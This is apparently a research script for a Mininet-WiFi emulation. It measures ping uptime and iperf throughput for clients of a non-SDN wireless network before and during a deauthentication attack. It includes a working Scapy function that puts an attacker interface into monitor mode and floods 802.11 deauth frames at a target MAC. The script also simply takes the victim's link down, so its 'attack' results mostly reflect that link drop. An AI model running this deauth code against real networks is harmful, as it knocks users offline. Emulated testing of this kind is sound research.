from mininet.node import Controller
from mn_wifi.node import OVSKernelAP
from mininet.log import setLogLevel, info
from mn_wifi.link import wmediumd
from mn_wifi.wmediumdConnector import interference
from mn_wifi.cli import CLI
from mn_wifi.net import Mininet_wifi
from mininet.link import TCLink
import time
import os
import csv
import re

def run_deauth_attack(attacker, target_mac, count=1500, interval=0.02):
    iwconfig_output = attacker.cmd(f'iwconfig {attacker.params["wlan"][0]}')
    info(f"[DEBUG] iwconfig output for {attacker.params['wlan'][0]}:\n{iwconfig_output}\n")
    scapy_cmd = (
        "from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp; "
        f"pkt=RadioTap()/Dot11(type=0, subtype=12, addr1='{target_mac}', addr2='{attacker.MAC()}', addr3='{target_mac}')/Dot11Deauth(); "
        f"sendp(pkt, iface='{attacker.params['wlan'][0]}', count={count}, inter={interval}, verbose=True)"
    )
    info(f"[DEBUG] Running deauth attack with count={count}, interval={interval}\n")
    result = attacker.cmd(f"python3 -c \"{scapy_cmd}\" & echo $!")
    info(f"[DEBUG] Deauth attack started, PID: {result.strip()}\n")

def scenario1_nonsdn(run_number=1):
    setLogLevel('info')
    net = Mininet_wifi(link=wmediumd, wmediumd_mode=interference)
    info("Running without SDN controller...\n")

    # Add access points
    ap1 = net.addAccessPoint('ap1', ssid='ap1-ssid', mode='g', channel='1', position='30,40,0')
    ap2 = net.addAccessPoint('ap2', ssid='ap2-ssid', mode='g', channel='6', position='60,40,0')
    ap3 = net.addAccessPoint('ap3', ssid='ap3-ssid', mode='g', channel='11', position='90,40,0')

    # Add stations (clients)
    clients_ap1 = [net.addStation(f'c{i}', ip=f'10.0.0.{i}/24', position=f'{25+i*2},30,0') for i in range(1, 5)]
    clients_ap2 = [net.addStation(f'c{i}', ip=f'10.0.0.{i}/24', position=f'{55+i*2},30,0') for i in range(5, 8)]
    clients_ap3 = [net.addStation(f'c{i}', ip=f'10.0.0.{i}/24', position=f'{85+i*2},30,0') for i in range(8, 11)]

    # Add attacker node
    attacker = net.addStation('attacker', ip='10.0.0.254/24', position='30,25,0')

    net.configureWifiNodes()
    net.addLink(ap1, ap2)
    net.addLink(ap2, ap3)

    net.plotGraph(max_x=120, max_y=100)
    net.build()
    net.start()
    time.sleep(5)

    results = {}
    c1, c2 = clients_ap1[0], clients_ap1[1]
    info(f"[DEBUG] Client 1 IP: {c1.IP()}\n")
    info(f"[DEBUG] Client 2 IP: {c2.IP()}\n")

    # Measure baseline uptime
    info("Measuring baseline uptime...\n")
    ping_success = 0
    for i in range(30):
        result = c1.cmd(f'ping -c 1 {c2.IP()}')
        info(f"[DEBUG] Ping {i+1}: {result}")
        if "1 received" in result or "1 packets received" in result:
            ping_success += 1
        time.sleep(0.5)
    baseline_uptime = (ping_success / 30) * 100
    info(f"[DEBUG] Baseline uptime: {baseline_uptime}%\n")
    results['baseline_uptime_percent'] = baseline_uptime

    # Measure baseline throughput
    info("Measuring baseline throughput...\n")
    server = c2.popen('iperf -s -u')
    time.sleep(1)
    client_output = c1.cmd(f'iperf -c {c2.IP()} -u -t 10')
    server.terminate()
    baseline_throughput_match = re.search(r'(\d+(?:\.\d+)?)\s+Mbits/sec', client_output)
    baseline_throughput = float(baseline_throughput_match.group(1)) if baseline_throughput_match else 0.0
    info(f"[DEBUG] Baseline throughput: {baseline_throughput} Mbps\n")
    results['baseline_throughput_mbps'] = baseline_throughput

    # Simulate de-authentication attack by dropping link
    info("Simulating de-authentication attack by dropping link...\n")
    net.configLinkStatus(c2.name, ap1.name, 'down')

    # Optionally run deauth attack for realism
    attacker_iface = attacker.params['wlan'][0]
    info(f"[DEBUG] Using attacker interface: {attacker_iface}\n")
    attacker.cmd(f"ip link set {attacker_iface} down")
    attacker.cmd(f"iw dev {attacker_iface} set type monitor")
    attacker.cmd(f"ip link set {attacker_iface} up")
    iwconfig_output = attacker.cmd(f"iwconfig {attacker_iface}")
    info(f"[DEBUG] iwconfig output after setting monitor mode:\n{iwconfig_output}\n")
    target_mac = c2.MAC()
    info(f"[DEBUG] Target MAC: {target_mac}\n")
    run_deauth_attack(attacker, target_mac, count=5000, interval=0.005)

    time.sleep(5)

    # Measure uptime during attack
    info("Measuring uptime during attack...\n")
    ping_success = 0
    for i in range(30):
        result = c1.cmd(f'ping -c 1 {c2.IP()}')
        info(f"[DEBUG] Ping {i+1}: {result}")
        if "1 received" in result or "1 packets received" in result:
            ping_success += 1
        time.sleep(0.5)
    uptime = (ping_success / 30) * 100
    info(f"[DEBUG] Uptime during attack: {uptime}%\n")
    results['uptime_during_attack_percent'] = uptime

    # Check uptime to determine throughput and packet loss
    if uptime == 0.0:
        results['packet_loss_percent'] = 100.0
        results['throughput_percent'] = 0.0
        info("[DEBUG] Link is down: setting packet loss to 100% and throughput to 0%\n")
    else:
        info("Measuring packet loss and throughput during attack...\n")
        server = c2.popen('iperf -s -u')
        time.sleep(1)
        client_output = c1.cmd(f'iperf -c {c2.IP()} -u -t 30')
        server.terminate()
        packet_loss_match = re.search(r'(\d+(?:\.\d+)?)%', client_output)
        packet_loss = float(packet_loss_match.group(1)) if packet_loss_match else 0.0
        throughput_match = re.search(r'(\d+(?:\.\d+)?)\s+Mbits/sec', client_output)
        throughput = float(throughput_match.group(1)) if throughput_match else 0.0
        throughput_percent = (throughput / baseline_throughput) * 100 if baseline_throughput else 0
        results['packet_loss_percent'] = packet_loss
        results['throughput_percent'] = throughput_percent
        info(f"[DEBUG] Packet loss during attack: {packet_loss}%\n")
        info(f"[DEBUG] Throughput during attack: {throughput} Mbps ({throughput_percent}%)\n")

    # Restore the link after the attack
    info("Restoring connection...\n")
    net.configLinkStatus(c2.name, ap1.name, 'up')

    # Write results to CSV
    os.makedirs('results', exist_ok=True)
    with open(f'results/results_s1_nonsdn_run{run_number}.csv', 'w') as f:
        writer = csv.writer(f)
        writer.writerow(['metric', 'value'])
        for key, value in results.items():
            writer.writerow([key, value])

    net.stop()

if __name__ == '__main__':
    for run in range(1, 4):
        scenario1_nonsdn(run_number=run)
